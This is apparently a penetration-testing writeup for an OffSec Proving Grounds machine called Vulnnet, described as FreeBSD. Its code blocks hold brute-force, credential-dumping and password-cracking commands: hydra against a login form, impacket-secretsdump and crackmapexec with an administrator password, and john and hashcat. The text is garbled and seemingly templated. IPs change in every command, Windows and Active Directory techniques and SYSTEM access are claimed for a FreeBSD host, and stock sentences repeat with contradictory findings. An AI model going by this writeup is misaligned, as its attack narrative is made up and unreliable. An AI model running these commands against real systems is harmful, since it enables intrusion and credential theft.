---
TitleSEO: "OffSec Proving Grounds — Vulnnet (Medium FreeBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Vulnnet (Medium FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Vulnnet. Weak Service Permissions and Cron Job to achieve medium compromise on FreeBSD."
Keywords: "active directory, ctf, web"
URL: "https://zurefx.github.io/writeups/htb-vulnnet-263.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-vulnnet-263/"
Date: "2025-05-25"
Tags: "Active Directory, CTF, Web"
Section: "writeups"
Lang: "en"
main_img: "htb-vulnnet-263"
Permalink: "/writeups/htb-vulnnet-263.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Vulnnet** is rated **Medium** on OffSec Proving Grounds. It runs **FreeBSD** and the IP address during this analysis was `10.22.43.5`.

### Objectives

Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.20.242.180 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p8443,143,135 10.46.239.117 -oN scan.txt
nmap -sCV -p1433,3268,8080 10.72.88.183 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.117.51.8
```

The kernel version was outdated and vulnerable to a publicly known exploit. Privilege escalation was possible due to misconfigured sudo permissions.

### Service Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.118.113.148 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

### Web Enumeration

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.98.179.72 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.118.220.214
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p445,636,445 10.18.59.163 -oN scan.txt
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities.

## Exploitation

### Vulnerability Identification

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

Key finding: **DNS Rebinding**.

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

### Initial Access

Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
crackmapexec smb 10.107.7.79 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.63.214.217/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.96.183.226
```

Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code.

## Privilege Escalation

### Enumeration

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality.

```powershell
crackmapexec smb 10.15.107.163 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Exploitation

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service account had excessive permissions assigned in Active Directory. Weak file permissions allowed modification of critical system files.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `kerbrute`
- `ffuf`
- `smbclient`
- `rpcclient`
- `impacket`
- `wmiexec`

### Key Takeaways

- Weak Service Permissions
- Cron Job
- DNS Rebinding
- SeImpersonatePrivilege
